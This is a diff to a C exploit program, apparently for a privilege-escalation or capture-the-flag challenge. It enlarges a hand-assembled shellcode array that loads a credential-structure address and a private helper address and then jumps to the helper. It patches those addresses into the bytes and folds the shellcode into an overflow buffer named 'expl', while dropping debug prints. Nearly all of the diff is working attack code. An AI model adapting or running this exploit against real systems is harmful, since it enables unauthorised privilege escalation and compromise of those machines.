@@ -76,20 +76,26 @@ int main() {
     expl[explsz/sizeof(void*)-5] = (void*)cur_auth_cred_loc; // db
 
 
-    uint64_t injected_code[16] = {
-        0x48, 0xb8, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 
-	0x01, 0x01, 0xff, 0xe0, 0x90, 0x90, 0x90, 0x90
+    uint64_t injected_code[64] = {
+        0xbf, 0x12, 0x34, 0x56, 0x70, 0x90, 0x90, 0x90, // mov    $0x12345670,%edi
+        0x48, 0xbe, 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc, // movabs $0x123456789abcdef0,%rsi
+        0xde, 0xf0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+        0x48, 0xba, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, // movabs <cred addr>,%rdx
+        0x01, 0x01, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+        0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // mov    <private helper addr>, %rax
+	    0x00, 0x00, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90,
+        0xff, 0xe0, 0x90, 0x90, 0x90, 0x90, 0x90, 0x90  // jmpq   *%rax
     };
     int injected_code_size = sizeof(injected_code) / sizeof(injected_code[0]);
 
+    for (int i = 0; i < 8; i++) {
+        uint8_t byte = (curr_auth_cred >> (i * 8)) & 0xFF;
+        injected_code[i+26] = byte;
+    }
 
-     for (int i = 0; i < 8; i++) {
+    for (int i = 0; i < 8; i++) {
         uint8_t byte = (curr_private_helper_addr >> (i * 8)) & 0xFF;
-        injected_code[i+2] = byte;
-     }
-
-    for(int i=0; i<16; i++) {
-    	printf("D0: %lx\n", injected_code[i]);
+        injected_code[i+42] = byte;
     }
 
     int curr_expl_location = 0;
@@ -102,10 +108,6 @@ int main() {
         }
         expl[curr_expl_location] += injected_code[i] << (shift_bytes*8);
         shift_bytes++;
-    }
-
-    for(int i=0; i<explsz/sizeof(void*); i++) {
-    	printf("D1: %x: %lx\n", i, (long unsigned int)expl[i]);
     }
 
     put_str("u ");
